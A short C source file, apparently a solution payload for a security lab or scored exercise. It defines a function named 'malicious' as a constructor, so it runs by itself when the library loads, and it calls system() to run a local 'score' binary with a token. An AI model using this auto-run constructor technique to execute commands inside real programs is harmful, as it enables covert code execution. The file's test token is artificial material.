#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
      system("/usr/local/bin/score 79b95ac2-29f2-47d9-b5bd-6b418dceb90e");
}

